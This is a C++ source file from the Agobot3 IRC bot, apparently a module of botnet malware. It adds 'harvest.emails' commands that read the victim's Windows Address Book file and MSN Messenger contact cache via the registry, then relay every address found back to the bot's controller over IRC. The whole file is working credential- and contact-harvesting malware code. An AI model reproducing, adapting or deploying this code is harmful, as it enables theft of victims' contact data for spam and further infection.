/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (c) 2004 Ago and the Agobot team
	All rights reserved.

	This is private software, you may redistribute it under the terms of
	the APL(Ago's Private License) which follows:
  
	Redistribution and use in binary forms, with or without modification,
	are permitted provided that the following conditions are met:
	1. The name of the author may not be used to endorse or promote products
	   derived from this software without specific prior written permission.
	2. The binary and source may not be sold and/or given away for free.
	3. The licensee may only create binaries for his own usage, not for any
	   third parties.
	4. The person using this sourcecode is a developer of said sourcecode.

	Redistribution and use in source forms, with or without modification,
	are not permitted.

	This license may be changed without prior notice.

	THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
	IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
	OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
	IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
	INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
	NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
	DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
	THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
	(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
	THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. */

#include "main.h"
#include "mainctrl.h"
#ifdef __COMPILE_HARVEST_EMAILS__
#include "harvest_emails.h"

bool CHarvest_EMails::Init() { return true; }

bool CHarvest_EMails::HandleCommand(CMessage *pMsg)
{	if(!pMsg->sCmd.Compare(m_cmdEMails.szName))
	{
#ifdef WIN32

		HANDLE hFile; char szPath[MAX_PATH];
		DWORD dwSize; HKEY hKey;

		dwSize=800;
		RegOpenKeyEx(HKEY_CURRENT_USER,
			"Software\\Microsoft\\WAB\\WAB4\\Wab File Name",
			0, KEY_ALL_ACCESS, &hKey);
		if(!hKey) return true;

		RegQueryValueEx(hKey, "", 0, 0, (unsigned char*)szPath, &dwSize);
		RegCloseKey(hKey);

		hFile=CreateFile((char*)szPath, GENERIC_READ, \
			FILE_SHARE_READ, NULL, OPEN_ALWAYS, \
			FILE_ATTRIBUTE_NORMAL, NULL);

		char *pszBuf=NULL;

		HANDLE hFileMap=CreateFileMapping(hFile, 0, \
			PAGE_READONLY, 0, 0, 0);

		if(!hFileMap) { CloseHandle(hFile); return true; }

		pszBuf=(char*)MapViewOfFile(hFileMap, FILE_MAP_READ, 0, 0, 0);
		if(!pszBuf) { CloseHandle(hFileMap); CloseHandle(hFile); return true; }

		int iNos=int(*(pszBuf+0x64));
		DWORD dwAdd=MAKELONG(	MAKEWORD(*(pszBuf+0x60), *(pszBuf+0x61)),
								MAKEWORD(*(pszBuf+0x62), *(pszBuf+0x63)));

		char szA1[300]; int ii, j=0, iLen;

		for(iLen=0; iLen<(iNos*68); iLen+=68) {
			for (ii=0;ii<=68;ii++) {
				szA1[ii]=*(pszBuf+dwAdd+j+iLen); j+=2;
			}
			szA1[68]='\0'; j=0;
			pMsg->pReply->DoReplyF(pMsg, "Found EMail (%s).", szA1);
		}

		CloseHandle(hFile);
		UnmapViewOfFile(pszBuf);
		CloseHandle(hFileMap);

				
		/* harvest msn contact list - evilbyte */
		HKEY hRegKey;
	    if (RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\MessengerService\\ListCache\\.NET Messenger Service", 0, KEY_ALL_ACCESS, &hRegKey) != ERROR_SUCCESS)
		    return true;

        BYTE bData[1024];
        DWORD dwKeySize = sizeof(bData);
        DWORD dwType = REG_BINARY;
        char szRegKey[128];
        int i = 0;
   
		while (1)
		{
            memset(szRegKey, 0, sizeof(szRegKey));
            sprintf(szRegKey, "Allow%d", i);
            i++;

            dwKeySize = sizeof(bData);
            memset(bData, 0, sizeof(bData));

            if (RegQueryValueEx(hRegKey, szRegKey, 0, &dwType, bData, &dwKeySize) != ERROR_SUCCESS)
			{
                RegCloseKey(hRegKey);
                return true;
			}

            char *szAdress = (char *)bData;
			pMsg->pReply->DoReplyF(pMsg, "Found EMail From MSN (%s).", szAdress);
	        Sleep(100); // prevent excess flood
		}

#endif // WIN32
	}

	else if(!pMsg->sCmd.Compare(m_cmdEMailsHTTP.szName))
	{
	}

	return true; }

REGOBJ(CHarvest_EMails, g_pHarvest_EMails, false, 0);
REGCMD(m_cmdEMails,  	"harvest.emails",					false,	g_pHarvest_EMails);
REGCMD(m_cmdEMailsHTTP,	"harvest.emailshttp", 	false,	g_pHarvest_EMails);

#endif // __COMPILE_HARVEST_EMAILS__
